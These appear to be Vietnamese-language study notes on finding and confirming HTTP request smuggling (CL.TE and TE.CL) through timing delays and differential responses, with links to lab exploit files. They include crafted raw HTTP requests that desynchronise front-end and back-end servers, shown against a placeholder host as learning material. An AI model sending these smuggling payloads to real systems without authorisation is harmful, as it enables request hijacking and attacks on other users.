# Finding HTTP request smuggling vulnerabilities.

## Finding HTTP request smuggling vulnerabilities using timing techniques.

- Cách hiệu quả nhất để phát hiện các lỗ hổng HTTP request smuggling là gửi các yêu cầu sẽ gây ra sự chậm trễ trong thời gian phản hồi của ứng dụng nếu có lỗ hổng.

### Finding CL.TE vulnerabilities using timing techniques.

- Nếu một ứng dụng dễ bị tấn công bởi CL.TE của request smuggling, thì việc gửi một yêu cầu như sau thường sẽ gây ra sự chậm trễ về thời gian:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```
- Vì máy chủ front-end sử dụng *Content-Length*, nó sẽ chỉ chuyển tiếp một phần của yêu cầu này, bỏ qua X. Máy chủ back-end sử dụng *Transfer-Encoding*, xử lý đoạn đầu tiên và sau đó đợi đoạn tiếp theo đến. Điều này sẽ gây ra độ trễ thời gian.

### Finding TE.CL vulnerabilities using timing techniques.

- Nếu một ứng dụng dễ bị tấn công bởi TE.CL, thì việc gửi một yêu cầu như sau thường sẽ gây ra sự chậm trễ về thời gian:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```
- Vì máy chủ front-end sử dụng *Transfer-Encoding*, nó sẽ chỉ chuyển tiếp một phần của yêu cầu này, bỏ qua X. Máy chủ back-end sử dụng *Content-Length*, mong đợi nhiều nội dung hơn trong nội dung thư và đợi nội dung còn lại đến. Điều này sẽ gây ra độ trễ thời gian.

## Confirming HTTP request smuggling vulnerabilities using differential responses.

- Khi một lỗ hổng request smuggling đã được phát hiện, bạn có thể thu thập thêm bằng chứng về lỗ hổng bằng cách khai thác nó để kích hoạt sự khác biệt trong nội dung phản hồi của ứng dụng. Điều này liên quan đến việc gửi liên tiếp hai yêu cầu đến ứng dụng:

	+ Yêu cầu "attack" được thiết kế để can thiệp vào việc xử lý yêu cầu tiếp theo.
	+ Một yêu cầu "normal".
- Nếu phản hồi đối với yêu cầu thông thường chứa nhiễu dự kiến, thì lỗ hổng bảo mật được xác nhận.
```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

- Yêu cầu này thường nhận được phản hồi HTTP với mã trạng thái 200, chứa một số kết quả tìm kiếm.
- Yêu cầu tấn công cần thiết để can thiệp vào yêu cầu này phụ thuộc vào biến thể hiện có: CL.TE vs TE.CL.

### Confirming CL.TE vulnerabilities using differential responses.

```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

- Nếu cuộc tấn công thành công, thì hai dòng cuối cùng của yêu cầu này được máy chủ back-end coi là thuộc về yêu cầu tiếp theo được nhận. Điều này sẽ khiến yêu cầu "normal" tiếp theo trông giống như sau:
```
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

- Vì yêu cầu này hiện chứa một URL không hợp lệ, máy chủ sẽ phản hồi với mã trạng thái 404, cho biết rằng yêu cầu tấn công đã thực sự can thiệp vào nó.

- Lab:
	+ Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses.[exploit](exploit/lab4.txt)

### Confirming TE.CL vulnerabilities using differential responses.

```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0
```
- Nếu cuộc tấn công thành công, thì mọi thứ từ *GET /404* sau trở đi sẽ được máy chủ back-end coi là thuộc về yêu cầu tiếp theo được nhận. Điều này sẽ khiến yêu cầu "normal" tiếp theo trông giống như sau:

```
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 146

x=
0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

- Vì yêu cầu này hiện chứa một URL không hợp lệ, máy chủ sẽ phản hồi với mã trạng thái 404, cho biết rằng yêu cầu tấn công đã thực sự can thiệp vào nó.

- Lab:
	+ Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses.[exploit](exploit/lab5.txt)